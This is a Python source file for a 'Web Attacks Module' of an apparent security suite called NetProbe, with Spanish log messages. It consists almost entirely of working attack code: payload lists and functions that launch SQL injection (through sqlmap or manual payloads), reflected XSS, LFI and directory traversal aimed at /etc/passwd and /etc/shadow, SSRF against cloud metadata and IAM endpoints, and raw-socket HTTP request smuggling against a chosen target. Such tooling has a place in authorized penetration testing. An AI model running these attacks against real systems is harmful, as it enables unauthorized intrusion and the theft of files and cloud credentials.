"""
NetProbe Security Suite - Web Attacks Module
Tools: sqlmap, httpx, socket
"""
import asyncio
import os
import re
import shutil
import socket
from utils.raw_exec import raw_exec

MODULE_NAMES = {
    "sqli":      "SQL Injection",
    "xss":       "XSS Attack",
    "lfi_rfi":   "LFI/RFI",
    "dir_trav":  "Directory Traversal",
    "ssrf":      "SSRF Probing",
    "http_smug": "HTTP Smuggling",
}

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
]

DIR_PATHS = [
    "../../../etc/passwd", "/etc/passwd", "/etc/hosts", "/proc/version",
    "../../../windows/win.ini", "C:/Windows/win.ini",
    "../../../etc/shadow", "/etc/issue",
]

SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://192.168.0.1/",
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/stats",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
]

SMUG_PAYLOADS = [
    # CL.TE
    b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
    # TE.CL
    b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
    # TE.TE obfuscation
    b"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: xchunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n",
]

async def run_web_module(module_id, target, intensity, duration, log_fn):
    name = MODULE_NAMES.get(module_id, module_id)
    await log_fn("MODULE", f"▶ {name}", module_id)
    runners = {
        "sqli":      _sqli,
        "xss":       _xss,
        "lfi_rfi":   _lfi_rfi,
        "dir_trav":  _dir_traversal,
        "ssrf":      _ssrf,
        "http_smug": _http_smuggling,
    }
    return await runners[module_id](target, intensity, log_fn)


async def _sqli(target, intensity, log_fn):
    # Try sqlmap first
    sqlmap = None
    for path in ["/opt/sqlmap/sqlmap.py", shutil.which("sqlmap") or ""]:
        if path and os.path.exists(path):
            sqlmap = path
            break

    if sqlmap:
        level = min(intensity, 5)
        risk  = min(intensity, 3)
        cmd = (f"python3 {sqlmap} -u 'http://{target}/?id=1' "
               f"--batch --level={level} --risk={risk} "
               f"--timeout=10 --retries=1 --output-dir=/tmp/sqlmap-{target.replace('.','_')}")
        out, err, rc = await raw_exec(cmd, log_fn, "sqli", timeout=120)
        full = out + err

        if re.search(r"is vulnerable|Parameter:.+injectable|sql injection", full, re.I):
            await log_fn("WARN", "🚨 SQL Injection confirmada por sqlmap", "sqli")
            param = re.search(r"Parameter: (\S+)", full)
            return {"vulnerable": True, "tool": "sqlmap", "parameter": param.group(1) if param else "?"}, "PASSED", 0
        if re.search(r"WAF|IPS|filtered|protected", full, re.I):
            return {"waf_detected": True}, "BLOCKED", 100
        if rc == 0:
            return {"vulnerable": False}, "BLOCKED", 100

    # Manual payloads fallback
    await log_fn("CMD", f"httpx manual SQLi payloads → http://{target}/", "sqli")
    try:
        import httpx
        payloads = ["'", "''", "`", "' OR '1'='1", "' OR 1=1--", "1 AND 1=1",
                    "1; SELECT 1", "' UNION SELECT NULL--", "1' ORDER BY 1--"]
        errors = ["sql syntax", "mysql_fetch", "ORA-", "PostgreSQL", "syntax error",
                  "unclosed quotation", "SQLSTATE", "sqlalchemy", "sqlite"]
        async with httpx.AsyncClient(verify=False, timeout=8) as client:
            for p in payloads:
                try:
                    r = await client.get(f"http://{target}/", params={"id": p, "q": p, "search": p})
                    await log_fn("RAW", f"GET /?id={p!r} → HTTP {r.status_code}", "sqli")
                    if any(e in r.text.lower() for e in errors):
                        await log_fn("WARN", f"🚨 SQL error en respuesta con payload: {p}", "sqli")
                        return {"vulnerable": True, "payload": p, "tool": "manual"}, "PASSED", 0
                except Exception as e:
                    await log_fn("RAW", f"Error: {e}", "sqli")
    except ImportError:
        await log_fn("WARN", "httpx no instalado: pip install httpx", "sqli")

    return {"vulnerable": False}, "BLOCKED", 100


async def _xss(target, intensity, log_fn):
    # Try XSStrike
    xsstrike = "/opt/xsstrike/xsstrike.py"
    if os.path.exists(xsstrike):
        cmd = f"python3 {xsstrike} -u 'http://{target}/?q=test' --timeout 10 --crawl"
        out, err, rc = await raw_exec(cmd, log_fn, "xss", timeout=90)
        if re.search(r"vulnerable|XSS|payload working", out + err, re.I):
            return {"vulnerable": True, "tool": "xsstrike"}, "PASSED", 0

    # Manual XSS payloads
    await log_fn("CMD", f"httpx manual XSS payloads → http://{target}/", "xss")
    try:
        import httpx
        found = []
        async with httpx.AsyncClient(verify=False, timeout=8) as client:
            for p in XSS_PAYLOADS:
                for param in ["q", "s", "search", "query", "name", "input", "text"]:
                    try:
                        r = await client.get(f"http://{target}/", params={param: p})
                        reflected = p.lower() in r.text.lower() or p in r.text
                        escaped   = re.search(re.escape(p).replace("\\<","&lt;"), r.text, re.I)
                        await log_fn("RAW", f"?{param}={p[:30]!r} → {r.status_code} | reflected={reflected}", "xss")
                        if reflected and not escaped:
                            found.append({"param": param, "payload": p})
                            await log_fn("WARN", f"🚨 XSS reflejado: ?{param}={p}", "xss")
                    except Exception:
                        pass
        if found:
            return {"vulnerable": True, "findings": found[:5]}, "PASSED", 0
    except ImportError:
        await log_fn("WARN", "httpx no instalado: pip install httpx", "xss")

    return {"vulnerable": False}, "BLOCKED", 100


async def _lfi_rfi(target, intensity, log_fn):
    await log_fn("CMD", f"httpx LFI/RFI payloads → http://{target}/", "lfi_rfi")
    try:
        import httpx
        indicators = ["root:x:", "root:!", "[boot loader]", "[fonts]", "for 16-bit",
                      "daemon:x:", "bin:x:", "/bin/bash", "Windows Registry"]
        findings = []
        async with httpx.AsyncClient(verify=False, timeout=8, follow_redirects=True) as client:
            for payload in LFI_PAYLOADS:
                for param in ["file", "page", "include", "path", "template", "load", "read", "doc"]:
                    try:
                        url = f"http://{target}/"
                        r   = await client.get(url, params={param: payload})
                        hit = next((i for i in indicators if i in r.text), None)
                        await log_fn("RAW", f"?{param}={payload[:40]} → {r.status_code} | match={hit}", "lfi_rfi")
                        if hit:
                            findings.append({"param": param, "payload": payload, "indicator": hit})
                            await log_fn("WARN", f"🚨 LFI confirmado: ?{param}={payload}", "lfi_rfi")
                    except Exception as e:
                        await log_fn("RAW", f"?{param}={payload[:30]} → Error: {e}", "lfi_rfi")
        if findings:
            return {"vulnerable": True, "findings": findings[:3]}, "PASSED", 0
    except ImportError:
        await log_fn("WARN", "httpx no instalado: pip install httpx", "lfi_rfi")

    return {"vulnerable": False}, "BLOCKED", 100


async def _dir_traversal(target, intensity, log_fn):
    await log_fn("CMD", f"httpx directory traversal → http://{target}/", "dir_trav")
    try:
        import httpx
        indicators = ["root:x:", "root:!", "[boot loader]", "[fonts]", "daemon:x:", "localhost"]
        found = []
        async with httpx.AsyncClient(verify=False, timeout=8, follow_redirects=False) as client:
            for path in DIR_PATHS:
                try:
                    r = await client.get(f"http://{target}/{path}")
                    hit = next((i for i in indicators if i in r.text), None)
                    await log_fn("RAW", f"GET /{path} → {r.status_code} | len={len(r.text)} | match={hit}", "dir_trav")
                    if r.status_code == 200 and hit:
                        found.append(path)
                        await log_fn("WARN", f"🚨 Traversal exitoso: /{path} → '{hit}'", "dir_trav")
                except Exception as e:
                    await log_fn("RAW", f"/{path} → Error: {e}", "dir_trav")
        if found:
            return {"files_accessed": found}, "PASSED", 0
    except ImportError:
        await log_fn("WARN", "httpx no instalado", "dir_trav")

    return {"files_accessed": []}, "BLOCKED", 100


async def _ssrf(target, intensity, log_fn):
    await log_fn("CMD", f"httpx SSRF probing → http://{target}/", "ssrf")
    try:
        import httpx
        indicators = ["ami-id", "instance-id", "meta-data", "computeMetadata",
                      "root:x:", "hostname", "local-ipv4", "iam"]
        found = []
        params = ["url", "uri", "path", "redirect", "dest", "next", "src", "href",
                  "callback", "link", "data", "return", "open", "file", "load"]
        async with httpx.AsyncClient(verify=False, timeout=6, follow_redirects=True) as client:
            for ssrf_url in SSRF_TARGETS[:4]:
                for param in params[:6]:
                    try:
                        r = await client.get(f"http://{target}/", params={param: ssrf_url})
                        hit = next((i for i in indicators if i in r.text.lower()), None)
                        await log_fn("RAW", f"?{param}={ssrf_url[:40]} → {r.status_code} | match={hit}", "ssrf")
                        if hit:
                            found.append({"param": param, "ssrf_url": ssrf_url, "indicator": hit})
                            await log_fn("WARN", f"🚨 SSRF confirmado: ?{param}={ssrf_url}", "ssrf")
                    except Exception:
                        pass
        if found:
            return {"vulnerable": True, "findings": found[:3]}, "PASSED", 0
    except ImportError:
        await log_fn("WARN", "httpx no instalado", "ssrf")

    return {"vulnerable": False}, "BLOCKED", 100


async def _http_smuggling(target, intensity, log_fn):
    await log_fn("CMD", f"socket HTTP smuggling (CL.TE, TE.CL, TE.TE) → {target}:80", "http_smug")
    results = {"variants_tested": 0, "vulnerable": False, "method": None}
    names   = ["CL.TE", "TE.CL", "TE.TE obfuscation"]

    for i, payload_template in enumerate(SMUG_PAYLOADS):
        try:
            payload = payload_template.replace(b"{host}", target.encode())
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target, 80))
            s.sendall(payload)
            try:
                resp = b""
                while True:
                    chunk = s.recv(4096)
                    if not chunk: break
                    resp += chunk
            except Exception:
                pass
            s.close()
            results["variants_tested"] += 1
            resp_str = resp.decode("utf-8", errors="ignore")
            await log_fn("RAW", f"[{names[i]}]\nSent: {len(payload)} bytes\nResponse: {resp_str[:300]}", "http_smug")

            # Check for signs of smuggling success
            if resp_str.count("HTTP/1.1") > 1 or "SMUGGLED" in resp_str:
                results["vulnerable"] = True
                results["method"] = names[i]
                await log_fn("WARN", f"🚨 HTTP Smuggling posible: {names[i]}", "http_smug")
        except ConnectionRefusedError:
            await log_fn("RAW", f"[{names[i]}] Puerto 80 cerrado en {target}", "http_smug")
        except Exception as e:
            await log_fn("RAW", f"[{names[i]}] Error: {e}", "http_smug")

    if results["vulnerable"]:
        return results, "PASSED", 0
    return results, "BLOCKED", 100
